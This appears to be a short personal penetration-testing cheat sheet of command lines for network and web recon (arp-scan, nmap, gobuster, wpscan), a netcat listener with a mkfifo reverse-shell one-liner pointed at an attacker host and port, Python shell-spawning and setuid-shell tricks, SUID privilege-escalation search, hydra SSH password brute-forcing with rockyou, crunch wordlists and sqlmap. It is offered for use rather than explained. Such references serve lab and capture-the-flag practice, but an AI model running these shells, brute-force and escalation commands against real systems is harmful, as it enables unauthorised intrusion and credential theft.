# Cheat Sheet

## TEST-EDIT

## arp-scan
```
sudo arp-scan --interface=ens33 --localnet
```

## wpscan
```
wpscan --api-token ####### --url http://website.com/directory -e --plugins-detection aggressive --ignore-main-redirect --force
```

## nmap
```
nmap -p- x.x.x.x --open
nmap -p21,80,443 x.x.x.x
nmap (-sV / -A) -p21,80,443 x.x.x.x
```

##  gobuster
```
gobuster dir --url http://whatever.com --wordlist /usr/share/wordlists/dirb/common.txt

gobuster dir --url http://whatever.com -x php,html,txt --wordlist /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -o dir.log
```

## netcat
```
nc -nlvp 8888 (host listener)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc (host port) >/tmp/f
```

## python
```
python -m http.server (setup a local webserver)
python -c 'import pty;pty.spawn("/bin/bash")' (spawn shell)
python -c 'import os; os.execl("/bin/sh", "sh", "-p")' (spawn shell)
```

## privesc
```
sudo -l
find / -type f -user root -perm -4000 2>/dev/null (find suid files)
```

## crunch
```
# example:
# “bev" + “1 upper char” + “2 num" + “2 lower char” + “1 symbol” + “1995”

# crunch pattern (-t) flags
• , = upper char
• % = number
• @ = lower char
• ^ = symbol

crunch 13 13 -t bev,%%@@^1995 -o wordlist.txt
```

## hydra
```
hydra ssh://<ip>:<port> -l username -P /opt/rockyou.txt
```

## sqlmap
```
sqlmap -u http://website:port/directory --answers="follow=Y" --batch
```

